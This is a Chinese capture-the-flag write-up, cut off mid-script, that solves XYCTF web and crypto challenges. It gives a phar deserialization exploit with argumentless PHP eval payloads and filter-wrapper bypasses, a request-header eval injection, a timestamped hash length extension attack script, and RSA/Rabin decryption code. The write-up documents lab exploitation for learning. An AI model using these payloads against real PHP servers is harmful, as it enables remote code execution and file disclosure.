<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>if('ch3nx1' === preg_replace('/;+/','ch3nx1' preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd)))</code><br />
要用到A-Z、a-z、()、;<br />
很明显是要我们<strong>构造无参RCE</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查看当前目录文件名</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"></span><br><span class="line">随机读取</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br><span class="line">读取上级目录文件</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br><span class="line"></span><br><span class="line">查看和读取根目录文件，概率构造，所获得的字符串第一位有几率是/，需要多试几次</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同时，还有注意到这个<br />
<strong>eval($this-&gt;cmd.‘isbigvegetablechicken!’);</strong><br />
不能把后面的脏数据带一起，不然eval函数执行不了<br />
可以利用<code>__halt_compiler()函数</code>终止文件编译进行截断</p>
<p>发现<code>.phar</code>无法上传，会出现<br />
<strong>!preg_match(“/__HALT_COMPILER/i”,FILE_CONTENTS)</strong><br />
<code>gzip</code>压缩一下，修改后缀为<code>.jpg</code>，经典绕过</p>
<p><code>if(preg_match('/^phar:\/\//i',$_POST['file']))</code>，post的文件开头不能含有<code>phar://</code><br />
绕过<br />
<a target="_blank" rel="noopener" href="https://vvmdx.github.io/2021/12/05/2021-12-05-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6Bypass/index.html">https://vvmdx.github.io/2021/12/05/2021-12-05-Phar反序列化及其Bypass/index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3rziDkDcDQwe%2BhwD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3rziDkDcDQwe%2BhwD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p>
<p>自己构建一个phar文件，<strong>将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;show_source(array_rand(array_flip(scandir(current(localeconv())))));__halt_compiler();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>还有一篇讲绕过的<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/MrWangisgoodboy/article/details/130146658">https://blog.csdn.net/MrWangisgoodboy/article/details/130146658</a><br />
POST:<br />
<code>file=compress.zlib://phar:///temp/xxxx/phar.jpg</code><br />
发现没输出，问学长，<code>compress.zlib是要开启zip拓展才有的，不一定能用</code><br />
一开始忘了，直接改的后缀，能打才怪</p>
<p><code>gzip</code>压一下，改后缀为<code>.jpg</code><br />
<code>file=php://filter/resource=phar:///temp/xxx/phar.phar.jpg</code></p>
<p>还有的就是文件签名修改，这样貌似快一点，还可以直接在后面进行写打通的代码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">new_file = s + sha1(s).digest() + h  <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line">f_gzip = gzip.GzipFile(<span class="string">&quot;phar.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f_gzip.write(new_file)</span><br></pre></td></tr></table></figure>
<p>发现确实是没打通，<code>无参RCE</code>还是出了点问题<br />
<img src="https://pic1.zhimg.com/80/v2-9ee9a6a3692f51068791691aa1a49d55_1440w.png" alt="" /></p>
<p>这种随机读的有时就很烦，不如拿请求头打一遍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//返回数组中的当前单元,默认取第一个值</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>()   <span class="comment">//current的别名</span></span><br><span class="line"><span class="title function_ invoke__">reset</span>()  <span class="comment">//将数组的内部指针指向第一个单元</span></span><br><span class="line"><span class="title function_ invoke__">end</span>()    <span class="comment">//将数组的内部指针指向最后一个单元</span></span><br><span class="line"><span class="title function_ invoke__">next</span>()   <span class="comment">//将数组中的内部指针向前移动一位</span></span><br></pre></td></tr></table></figure>
<p>第一个请求头实现命令执行，<code>print_r(getallheaders());eval(current(getallheaders()));__halt_compiler();</code></p>
<p><img src="https://picx.zhimg.com/80/v2-45bebd8857cf1c0ed80b6fc5da31db55_1440w.png" alt="" /><br />
我的建议是bp发包，你用<code>hackbar</code>加的请求头会不知道飙哪里去了</p>
<p>我在<code>NewStarCTF2023复现</code>中使用到了<code>UA头</code>，用的是<code>next()</code>，但这里我没打出来，没用bp发包，我觉得大概率是<code>hackbar</code>的锅，后知后觉</p>
<p>如果是读文件，给个网上wp的参考，<code>highlight_file(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));__halt_compiler();</code></p>
<p>真得写脚本跑一下了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">url = <span class="string">&quot;http://gz.imxbt.cn:20506/class.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    resp = requests.post(url, data=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;php://filter/resource=phar:///tmp/628941e623f5a967093007bf39be805f.jpg&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XYCTF&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
<p>会不会我最开始上面的那个读文件，也需要脚本跑一下？(狗头)</p>
<h2 id="web-give-me-flag"><a class="markdownIt-Anchor" href="#web-give-me-flag"></a> Web give me flag</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">a290ddddf67ee8e5165cfea1d42c4f92</span><br></pre></td></tr></table></figure>
<p>带时间戳的哈希长度拓展攻击<br />
文章<br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a><br />
其实也没有讲到时间戳，也还好吧，自己加进去<br />
攻击脚本<br />
<a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a><br />
需要增加flag长度爆破(其实不用，动态flag，格式：flagname{uuid.uuid4()}，所以是，7+36=43)，加入时间戳<br />
参考<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/135177452">https://blog.csdn.net/2301_76690905/article/details/135177452</a><br />
其实加时间戳就是提前设置时间就可以了，正常来说提前5秒就够了<br />
<img src="https://picx.zhimg.com/80/v2-8f25be6b5bf44f3f618aff14882bb5c5_1440w.png" alt="" /></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20508/?md5=4d4dc106e17034ce3d33c6bc8c73616b&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(time.time())</span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>或者修改<code>hash-ext-attack-master\common\HashExtAttack.py</code>，在脚本中手动加入时间戳</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">self, i</span>):</span><br><span class="line">        self.run(</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;0aa76d17234720c5780c581d97d32b84&quot;</span>, <span class="built_in">str</span>(<span class="built_in">int</span>(time.time())), i)</span><br></pre></td></tr></table></figure>
<p><code>hash-ext-attack-master</code>文件夹下，新建py文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> common.HashExtAttack <span class="keyword">import</span> HashExtAttack</span><br><span class="line"></span><br><span class="line">hash_ext_attack = HashExtAttack()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    hash_ext_attack.test(<span class="number">43</span>)</span><br><span class="line">    value = urllib.parse.quote(hash_ext_attack.new_text[<span class="number">43</span>:-<span class="number">10</span>], safe=<span class="string">&#x27;&amp;=&#x27;</span>)</span><br><span class="line">    md5 = hash_ext_attack.new_hash</span><br><span class="line">    url = <span class="string">&quot;http://gz.imxbt.cn:20508/&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&quot;md5&quot;</span>: md5, <span class="string">&quot;value&quot;</span>: urllib.parse.unquote(value)&#125;</span><br><span class="line">    r = requests.get(url + <span class="string">f&quot;?md5=<span class="subst">&#123;md5&#125;</span>&amp;value=<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">f&quot;?md5=<span class="subst">&#123;md5&#125;</span>&amp;value=<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;yes&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>一个直接借助原脚本，一个则是稍微做出了修改</p>
<p>原平台貌似时延比较大？现复现平台一跑就出了</p>
<h2 id="web-baby_unserialize"><a class="markdownIt-Anchor" href="#web-baby_unserialize"></a> Web baby_unserialize</h2>
<p>暂无</p>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="crypto-sign1n签到"><a class="markdownIt-Anchor" href="#crypto-sign1n签到"></a> Crypto Sign1n[签到]</h2>
<p>其实就是对代码进行逆向操作，读懂代码，然后稍微改动原代码即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b = <span class="string">&#x27;12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567780113445678912234577900133457889122356678911344577991223566780113355788901245667901134456789122355788001334568991123467799023445678012235578800133457889113356679001344567991223557880012355788911235667991134457799122355788001245578891124566789023445788912234677801124456899013356679001245578801233467789112355779912234577990233556780113&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) - i - <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dec_b = custom_add(b)</span><br><span class="line">bin_str = swap_bits(dec_b)</span><br><span class="line"><span class="comment"># print(bin_str)</span></span><br><span class="line">flag = <span class="number">0b1011000010110010100001101010100010001100111101101100011001101000110001001100110001100110011100000111001001101100010110100110101001101010011000100110100001011010011010000110011001101010011000100101101001110000011100101100001011000010010110100110000001101110011100000110101011000110011010100110100001100110011000100110100001100000011011001111101</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># XYCTF&#123;c4bf3896-5514-4351-89aa-0785c5431406&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="crypto-sign1n_revenge"><a class="markdownIt-Anchor" href="#crypto-sign1n_revenge"></a> Crypto Sign1n_Revenge</h2>
<p>签到题打法。。。</p>
<h2 id="crypto-happy_to_solve1"><a class="markdownIt-Anchor" href="#crypto-happy_to_solve1"></a> Crypto happy_to_solve1</h2>
<p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure>
<p>q是p取反的下一个素数，指路<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62506844/article/details/124256746">https://blog.csdn.net/m0_62506844/article/details/124256746</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">t1 = <span class="number">1</span> &lt;&lt; <span class="number">512</span></span><br><span class="line">p = (<span class="number">2</span>**<span class="number">512</span>+gmpy2.iroot((<span class="number">2</span>**<span class="number">512</span>)**<span class="number">2</span>-<span class="number">4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">while</span> n % p != <span class="number">0</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="crypto-babyrsamax"><a class="markdownIt-Anchor" href="#crypto-babyrsamax"></a> Crypto babyRSAMAX</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">n = <span class="number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span></span><br><span class="line">gift1 = <span class="number">4549402444746338327349007235818187793950285105091726167573552412678416759694660166956782755631447271662108564084382098562999950228708300902201571583419116299932264478381197034402338481872937576172197202519770782458343606060544694608852844228400457232100904217062914047342663534138668490328400022651816597367310</span></span><br><span class="line">gift2 = <span class="number">111061215998959709920736448050860427855012026815376672067601244053580566359594802604251992986382187891022583247997994146019970445247509119719411310760491983876636264003942870756402328634092146799825005835867245563420135253048223898334460067523975023732153230791136870324302259127159852763634051238811969161011462</span></span><br><span class="line">c = <span class="number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span></span><br><span class="line">y = <span class="number">1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217</span></span><br><span class="line">q = GCD(gift2-gift1, n)</span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">e = <span class="built_in">pow</span>(y, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(e))</span><br><span class="line">e = <span class="number">4096</span></span><br></pre></td></tr></table></figure>
<p>e=2^12，一开始没有任何思路，但慢慢搜素发现了这个神奇的Rabin体系，之前没好好学QWQ<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/533927542">https://zhuanlan.zhihu.com/p/533927542</a><br />
指路<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_73643549/article/details/134096838">https://blog.csdn.net/qq_73643549/article/details/134096838</a><br />
又或者NewStar2023 week4 signin</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span></span><br><span class="line">gift1 = <span class="number">4549402444746338327349007235818187793950285105091726167573552412678416759694660166956782755631447271662108564084382098562999950228708300902201571583419116299932264478381197034402338481872937576172197202519770782458343606060544694608852844228400457232100904217062914047342663534138668490328400022651816597367310</span></span><br><span class="line">gift2 = <span class="number">111061215998959709920736448050860427855012026815376672067601244053580566359594802604251992986382187891022583247997994146019970445247509119719411310760491983876636264003942870756402328634092146799825005835867245563420135253048223898334460067523975023732153230791136870324302259127159852763634051238811969161011462</span></span><br><span class="line">c = <span class="number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span></span><br><span class="line">y = <span class="number">1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217</span></span><br><span class="line">q = GCD(gift2-gift1, n)</span><br><span class="line">p = n//q</span><br><span class="line">inv_p = inverse(p, q)</span><br><span class="line">inv_q = inverse(q, p)</span><br><span class="line">cs = [c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cs:</span><br><span class="line">        r = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        s = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">        x = (r*inv_q*q + s * inv_p * p) % n</span><br><span class="line">        y = (r*inv_q*q - s * inv_p * p) % n</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(x)</span><br><span class="line">        <span class="keyword">if</span> n - x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - x)</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(y)</span><br><span class="line">        <span class="keyword">if</span> n - y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - y)</span><br><span class="line">    cs = ps  <span class="comment"># 嵌套</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;XYCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="crypto-factor1"><a class="markdownIt-Anchor" href="#crypto-factor1"></a> Crypto factor1</h2>
<p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">512</span>)</span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">3</span> - <span class="number">1</span>) * (q**<span class="number">3</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(p * q)</span><br><span class="line"><span 